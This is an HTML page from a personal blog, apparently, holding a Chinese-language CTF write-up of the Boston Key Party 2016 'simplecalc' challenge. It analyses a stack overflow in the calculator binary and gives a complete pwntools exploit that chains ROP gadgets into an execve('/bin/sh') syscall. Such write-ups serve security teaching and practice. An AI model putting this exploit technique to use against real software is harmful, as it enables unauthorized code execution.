@@ -1,0 +1,320 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Boston Key Part 2016 simplecalc-wp | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="相关资源  
+文件分析1234567$ checksec simplecalc[*] &amp;#x27;/Hackery/pod/modules/bof_static/bkp16_simplecalc/simplecalc&amp;#x27;    Arch:     amd64-64-little    REL">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Boston Key Part 2016 simplecalc-wp"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												Boston Key Part 2016 simplecalc-wp
+									
+									
+								</h1>
+								
+									<p id="/2023/08/15/BKP2016-simplecalc-wp/" class="leancloud-visitors view"
+										data-flag-title="Boston Key Part 2016 simplecalc-wp">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/07-bof_static/bkp16_simplecalc">相关资源</a>  </p>
+<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec simplecalc</span><br><span class="line">[*] <span class="string">&#x27;/Hackery/pod/modules/bof_static/bkp16_simplecalc/simplecalc&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ./simplecalc  </span><br><span class="line">    |<span class="comment">#------------------------------------#|</span></span><br><span class="line">    |         Something Calculator         |</span><br><span class="line">    |<span class="comment">#------------------------------------#|</span></span><br><span class="line"></span><br><span class="line">Expected number of calculations: 50</span><br><span class="line">Options Menu:</span><br><span class="line"> [1] Addition.</span><br><span class="line"> [2] Subtraction.</span><br><span class="line"> [3] Multiplication.</span><br><span class="line"> [4] Division.</span><br><span class="line"> [5] Save and Exit.</span><br><span class="line">=&gt; 1</span><br><span class="line">Integer x: 1</span><br><span class="line">Integer y: 1</span><br><span class="line">Do you really need <span class="built_in">help</span> calculating such small numbers?</span><br><span class="line">Shame on you... Bye</span><br></pre></td></tr></table></figure>
+
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/14/BKP2016-simplecalc-wp/0x1.png?raw=true" alt="img">  </p>
+<ol>
+<li>可以看到首先获取输入<code>v20</code>，然后进行<code>v20</code>次计算操作，计算结果存入数组<code>v21</code>中</li>
+<li>当选择选项5时，会将<code>v21</code>中的内容全部拷贝到<code>v18</code>中，明显此处存在栈溢出切溢出内容我们可以通过计算结果来控制</li>
+</ol>
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>该文件是静态链接的，但是没有找到库函数<code>system</code>，并且开启了栈不可执行<br><code>ALT+T</code> 查找<code>syscall</code> 发现存在，则可以利用系统调用来实现攻击<br>参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">rdi -&gt; &#x27;/bin/sh&#x27;字符串指针</span><br><span class="line">rsi -&gt; 0</span><br><span class="line">rdx -&gt; 0</span><br><span class="line">rax -&gt; 0x3b</span><br><span class="line">```  </span><br><span class="line">1. 由`ROPgadget`我们可以获取到可用pop指令地址</span><br><span class="line">2. 需要将&#x27;/bin/sh&#x27;写入到数据段中（写在栈上不知道地址，数据段地址固定）  </span><br><span class="line">    * `ROPgadget --binary simplecalc --only &quot;mov|ret&quot;`</span><br><span class="line">    * 刚好有 `0x0000000000400aba : mov qword ptr [rdi], rdx ; ret`</span><br><span class="line">    * 则只要构造pop链将目标地址置入`rdi`，将&#x27;/bin/sh&#x27;置入`rdx`再调用即可</span><br><span class="line">3. 最后构造pop链执行`syscall`</span><br><span class="line"></span><br><span class="line">## exp</span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">mode = &#x27;&#x27;</span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    mode = sys.argv[1]</span><br><span class="line"></span><br><span class="line">proc = process(&quot;./simplecalc&quot;)</span><br><span class="line"></span><br><span class="line">def s(x): proc.send(x)</span><br><span class="line">def sl(x): return proc.sendline(x)</span><br><span class="line">def sd(x): return proc.send(x)</span><br><span class="line">def sla(x, y): return proc.sendlineafter(x, y)</span><br><span class="line">def sa(x, y): return proc.sendafter(x, y)</span><br><span class="line">def ru(x): return proc.recvuntil(x)</span><br><span class="line">def rc(): return proc.recv()</span><br><span class="line">def rl(): return proc.recvline()</span><br><span class="line">def li(con): return log.info(con)</span><br><span class="line">def ls(con): return log.success(con)</span><br><span class="line">def pi(): return proc.interactive()</span><br><span class="line">def pcls(): return proc.close()</span><br><span class="line">def ga(): return u64(ru(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">def addSingle(x):</span><br><span class="line">	proc.recvuntil(&quot;=&gt; &quot;)</span><br><span class="line">	proc.sendline(&quot;1&quot;)</span><br><span class="line">	proc.recvuntil(&quot;Integer x: &quot;)</span><br><span class="line">	proc.sendline(&quot;100&quot;)</span><br><span class="line">	proc.recvuntil(&quot;Integer y: &quot;)</span><br><span class="line">	proc.sendline(str(x - 100))  # 注意代码要求任意参与运算的数字都要大于0x27</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(z): </span><br><span class="line">    # 注意数组中每个位置为int(dword型)，</span><br><span class="line">    # 64位栈内基本块为qword，因此要分高低32位分别存入</span><br><span class="line">	x = z &amp; 0xffffffff</span><br><span class="line">	y = ((z &amp; 0xffffffff00000000) &gt;&gt; 32) </span><br><span class="line">	addSingle(x)</span><br><span class="line">	addSingle(y)</span><br><span class="line"></span><br><span class="line">gscript = &#x27;&#x27;&#x27;</span><br><span class="line">    b main</span><br><span class="line">    b * 0x401545</span><br><span class="line">    c</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">if mode == &#x27;-d&#x27;:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">rax_ret = 0x44db34</span><br><span class="line">rdx_ret = 0x437a85</span><br><span class="line">rdi_ret = 0x401b73</span><br><span class="line">rsi_ret = 0x401c87</span><br><span class="line">syscall = 0x400488</span><br><span class="line">dest = 0x6C4480</span><br><span class="line">mv_rdx2_prdi = 0x400aba</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># rdi_ret + dest + rdx_ret + b&#x27;/bin/sh\x00&#x27; + mv_rdx2_prdi</span><br><span class="line"># rsi_ret + p64(0) + rdx_ret + p64(0) + rax_ret + p64(0x3b) + syscall</span><br><span class="line">sla(b&#x27;calculations: &#x27;, b&#x27;100&#x27;)</span><br><span class="line">for i in range(9):</span><br><span class="line">    # 填满当前栈空间，注意填到v21时最好填0，</span><br><span class="line">    # 因为代码会对v21进行free操作，填其他的可能触发段错误</span><br><span class="line">    add(0)       </span><br><span class="line"></span><br><span class="line">add(rdi_ret)  </span><br><span class="line">add(dest)</span><br><span class="line">add(rdx_ret)</span><br><span class="line">add(0x0068732f6e69622f)   # /bin/sh</span><br><span class="line"></span><br><span class="line">add(mv_rdx2_prdi)</span><br><span class="line">add(rsi_ret)</span><br><span class="line">add(0)</span><br><span class="line">add(rdx_ret)</span><br><span class="line">add(0)</span><br><span class="line">add(rax_ret)</span><br><span class="line">add(0x3b)</span><br><span class="line">add(syscall)</span><br><span class="line"></span><br><span class="line">sla(b&#x27;=&gt; &#x27;, b&#x27;5&#x27;)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2023/08/15/BKP2016-simplecalc-wp/" class="leancloud-visitors view" data-flag-title="Boston Key Part 2016 simplecalc-wp">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/08/10/D3CTF2019-ezupload/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-08-15 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/pwn-wp/">pwn-wp<span>7</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>40</span></a></li> <li><a href="/tags/pwn/">pwn<span>11</span></a></li> <li><a href="/tags/stack/">stack<span>3</span></a></li> <li><a href="/tags/BKP2016/">BKP2016<span>1</span></a></li> <li><a href="/tags/nightmare/">nightmare<span>1</span></a></li> <li><a href="/tags/ret2syscall/">ret2syscall<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
